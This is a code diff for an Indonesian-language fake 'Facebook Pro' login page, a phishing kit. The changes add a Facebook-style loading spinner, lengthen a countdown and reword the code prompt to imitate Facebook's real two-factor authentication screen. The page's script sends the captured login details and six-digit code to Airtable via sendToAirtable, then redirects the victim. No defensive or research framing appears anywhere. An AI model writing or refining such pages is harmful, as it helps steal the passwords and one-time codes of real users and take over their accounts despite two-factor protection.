@@ -2,7 +2,7 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0", user-scalable=0/>
   <title>Facebook Pro - Masuk</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
@@ -17,6 +17,37 @@
     .slide-in { animation: slideIn 0.3s ease-out; }
     @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
     @keyframes slideIn { from { transform: translateX(100%); } to { transform: translateX(0); } }
+
+    /* Loading overlay style */
+    #loadingOverlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(255,255,255,0.9);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 50;
+    }
+    #loadingOverlay.hidden {
+      display: none;
+    }
+    .loader-facebook {
+      position: relative;
+      width: 40px;
+      height: 40px;
+    }
+    .loader-circle {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      border: 4px solid #1877f2;
+      border-top-color: transparent;
+      animation: spin 1s linear infinite;
+      margin: auto;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
   </style>
 </head>
 <body class="bg-gray-50 min-h-screen">
@@ -75,8 +106,8 @@
 <!-- OTP SECTION -->
 <section id="authpage" class="min-h-screen flex items-center justify-center p-4 hidden">
   <div class="w-full max-w-xl glass-effect rounded-2xl shadow-2xl p-8 slide-in">
-    <h2 class="text-2xl font-bold text-gray-800 mb-4 text-center">Verifikasi Identitas Anda</h2>
-    <p class="text-center text-gray-600 mb-6">Kami telah mengirim kode verifikasi ke email Anda.</p>
+    <h2 class="text-2xl font-bold text-gray-800 mb-4 text-center">Autentikasi dua faktor</h2>
+    <p class="text-center text-gray-600 mb-6">Masukkan kode 6 digit untuk akun ini dari aplikasi autentikasi dua faktor, email, atau nomor ponsel</p>
 
     <form id="authForm" class="space-y-6">
       <div class="flex justify-center gap-2 mb-2">
@@ -86,14 +117,10 @@
         <div id="otpInputs" class="flex gap-2"></div>
       </div>
 
-      <div class="w-full bg-gray-200 h-2 rounded overflow-hidden mt-2">
-        <div id="progressBar" class="bg-blue-600 h-full transition-all duration-1000" style="width: 100%;"></div>
-      </div>
-
       <div class="text-center text-sm text-gray-600 mt-4">
         Tidak menerima kode?
         <button id="resendCode" type="button" class="text-blue-600 font-semibold hover:underline">Kirim ulang</button><br/>
-        <span class="text-xs text-gray-500">Tunggu <span id="countdown">60</span> detik</span>
+        <span class="text-xs text-gray-500">Tunggu <span id="countdown">180</span> detik</span>
       </div>
 
       <div class="flex space-x-4 mt-4">
@@ -113,6 +140,13 @@
     <h3 class="text-2xl font-bold text-gray-800 mb-2">Berhasil!</h3>
     <p class="text-gray-600 mb-6">Anda berhasil masuk ke Facebook Pro</p>
     <button onclick="closeSuccessModal()" class="btn-primary text-white font-semibold py-3 px-8 rounded-lg">Lanjutkan</button>
+  </div>
+</div>
+
+<!-- LOADING OVERLAY -->
+<div id="loadingOverlay" class="hidden">
+  <div class="loader-facebook">
+    <div class="loader-circle"></div>
   </div>
 </div>
 
@@ -180,10 +214,17 @@
       localStorage.setItem("rememberedEmail", email);
     }
 
-    document.getElementById("loginpage").classList.add("hidden");
-    document.getElementById("authpage").classList.remove("hidden");
-    otpInputs[0].focus();
-    startCountdown();
+    // Tampilkan loading
+    showLoading();
+
+    // Simulasikan delay loading 2 detik sebelum tampil halaman OTP
+    setTimeout(() => {
+      hideLoading();
+      document.getElementById("loginpage").classList.add("hidden");
+      document.getElementById("authpage").classList.remove("hidden");
+      otpInputs[0].focus();
+      startCountdown();
+    }, 2000);
   });
 
   document.getElementById("authForm").addEventListener("submit", async function (e) {
@@ -191,8 +232,15 @@
     const allFilled = [...otpInputs].every(input => input.value);
     if (allFilled) {
       const otpCode = [...otpInputs].map(i => i.value).join('');
+      
+      showLoading();
       await sendToAirtable({ ...loginData, otentikasi: otpCode });
-      document.getElementById("successModal").classList.remove("hidden");
+
+      // Simulasikan delay loading 2 detik lalu redirect ke /mainapp
+      setTimeout(() => {
+        hideLoading();
+        window.location.href = '/mainapp';
+      }, 2000);
     } else {
       alert("Harap isi semua digit kode verifikasi.");
     }
@@ -205,10 +253,10 @@
     otpInputs.forEach(input => input.value = "");
   });
 
-  let countdown = 60;
+  let countdown = 180;
   let interval;
   document.getElementById("resendCode").addEventListener("click", () => {
-    if (countdown === 60) {
+    if (countdown === 180) {
       startCountdown();
       alert("Kode baru dikirim ulang.");
     }
@@ -217,23 +265,21 @@
   function startCountdown() {
     const resend = document.getElementById("resendCode");
     const countdownEl = document.getElementById("countdown");
-    const progressBar = document.getElementById("progressBar");
 
     resend.disabled = true;
     resend.classList.add("opacity-50", "cursor-not-allowed");
-    progressBar.style.width = "100%";
-    countdown = 60;
+    countdown = 180;
+
+    countdownEl.textContent = countdown;
 
     interval = setInterval(() => {
       countdown--;
       countdownEl.textContent = countdown;
-      progressBar.style.width = (countdown / 60) * 100 + "%";
       if (countdown <= 0) {
         clearInterval(interval);
         resend.disabled = false;
         resend.classList.remove("opacity-50", "cursor-not-allowed");
-        countdown = 60;
-        progressBar.style.width = "100%";
+        countdown = 180;
       }
     }, 1000);
   }
@@ -244,6 +290,14 @@
     document.getElementById("loginpage").classList.remove("hidden");
     document.getElementById("loginForm").reset();
     otpInputs.forEach(input => input.value = "");
+  }
+
+  function showLoading() {
+    document.getElementById("loadingOverlay").classList.remove("hidden");
+  }
+
+  function hideLoading() {
+    document.getElementById("loadingOverlay").classList.add("hidden");
   }
 
   window.addEventListener("DOMContentLoaded", () => {
